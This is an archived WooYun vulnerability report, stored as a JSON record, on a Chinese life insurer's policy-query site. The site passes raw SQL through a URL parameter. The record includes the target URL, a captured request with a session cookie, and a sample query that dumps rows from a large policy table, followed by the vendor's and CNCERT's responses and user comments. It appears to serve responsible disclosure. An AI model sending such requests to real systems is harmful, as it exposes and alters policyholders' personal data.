{"id": 14890, "wybug_id": "wooyun-2015-0117984", "wybug_title": "看我如何在前台任意操作华夏人寿保险某系统数据库", "wybug_corp": "华夏人寿保险", "wybug_author": "茜茜公主", "wybug_date": "2015-06-03 15:40", "wybug_open_date": "2015-07-20 17:56", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向公众公开  简要描述： 第一次遇到这种情况 详细说明：  华夏人寿保单查询系统直接上问题链接\nhttp://gdxt.hxlife.com/ui/sys/OuterNetworkQueryInput.jsp\n\n\n任意输入个保单号，然后查询时，抓包\n\n\nGET http://gdxt.hxlife.com/ui/common/easyQueryVer3/EasyQueryXML.jsp?strSql=select%20ManageComName,%20%20%20%20%20%20%20%20contno,%20%20%20%20%20%20%20%20appntname,%20%20%20%20%20%20%20%20to_char(cvalidate,'yyyy-MM-dd'),%20%20%20%20%20%20%20to_char(cvalidate,'yyyy-MM-dd')%20||%20'    '%20||%20to_char(cinvalidate,'yyyy-MM-dd'),%20%20%20%20%20%20%20%20Peoples2,%20%20%20%20%20%20%20%20PayIntv,%20%20%20%20%20%20%20%20riskname,%20%20%20%20%20%20%20%20Prem,%20%20%20%20%20%20%20%20amnt%20%20%20from%20qlccont%20%20where%20'1433315041000'%3D'1433315041000'%20and%20%20DataSrc%20%3D%20'LIS'%20%20%20%20and%20standbyflag1%20%3D%20'0'%20%20%20%20and%20state%20%3D%20'1'%20and%20contno%3D'wooyun'&strStart=1&LargeFlag=0 HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://gdxt.hxlife.com/ui/sys/OuterNetworkQueryInput.jspAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: gdxt.hxlife.comConnection: Keep-AliveCookie: JSESSIONID=rQn6Vn2TSLL7Z7mlnpmG1bxQqtddTyT7RVTQHNwVB8kRQwvnpnX1!516164096\n没错，你没有看错，直接把sql代入参数strSql   漏洞证明：  所以我们可以这样\n\n数据量：45995958查询前10行一探究竟\nselect * from qlccont where rownum<11\n\n\n一张表就这样了，数据库整体的数据量非常可观\n\n\n\n\n\n\n\n何况还可以增删改   修复方案：  参数不能这样传   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-05 17:55 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向保险行业信息化主管部门通报，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-03 15:40 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  漂亮啊！    \n     2015-06-03 16:30 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  喔    \n     2015-06-03 16:42 |    \t\t中国日报网(乌云厂商)\t\t \n  前排~    \n     2015-06-03 17:37 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @中国日报网 哈哈，你也成了白帽子了。    \n     2015-07-20 18:18 |    \t\tSecurity \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:9        )\t\t \n  一抓一个准    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}